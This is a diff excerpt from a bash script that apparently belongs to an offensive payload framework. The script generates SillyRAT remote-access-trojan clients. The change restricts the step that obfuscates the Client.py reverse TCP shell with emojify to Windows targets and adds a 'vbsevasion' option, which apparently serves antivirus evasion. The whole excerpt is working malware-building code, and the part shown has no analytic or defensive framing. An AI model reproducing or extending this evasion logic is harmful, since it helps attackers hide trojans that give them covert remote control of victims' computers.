@@ -10442,18 +10442,20 @@ xterm -T "SillyRAT - Generator Mode" -geometry 120x23 -e "python3 server.py gene
 cd $IPATH/output
 ## OBFUSCATION: Make sure emojify obfuscator its installed
 # Author: @chris-rands (https://github.com/chris-rands/emojify)
-if [ "$easter_egg" = "ON" ]; then
-   echo "${BlueF}[☠]${white} Obfuscate Client.py rev shell (emojify)"${Reset};sleep 2
-   audit=$(pip3 show emojify) > /dev/null 2>&1
-   if [ "$?" -ne "0" ]; then
-      echo "${RedF}[ERROR] emojify obfuscator not found.${white}";sleep 2
-      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing emojify obfuscator."${Reset};
-      echo "" && sudo apt-get update && pip3 install emojify && echo ""
+if [ "$SOSP" = "Windows" ]; then
+   if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
+      echo "${BlueF}[☠]${white} Obfuscate Client.py rev tcp shell (emojify)"${Reset};sleep 2
+      audit=$(pip3 show emojify) > /dev/null 2>&1
+      if [ "$?" -ne "0" ]; then
+         echo "${RedF}[ERROR] emojify obfuscator not found.${white}";sleep 2
+         echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing emojify obfuscator."${Reset};
+         echo "" && sudo apt-get update && pip3 install emojify && echo ""
+      fi
+      ## Obfuscate Client.py sourcecode using emojify
+      emojify --input $Drop.py --output obfuscated.py > /dev/nul 2>&1
+      mv obfuscated.py $Drop.py > /dev/nul 2>&1
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} $Drop.py successfully obfuscated."${Reset};sleep 2
    fi
-   ## Obfuscate Client.py sourcecode using emojify
-   emojify --input $Drop.py --output obfuscated.py > /dev/nul 2>&1
-   mv obfuscated.py $Drop.py > /dev/nul 2>&1
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} $Drop.py successfully obfuscated."${Reset};sleep 2
 fi
 
 
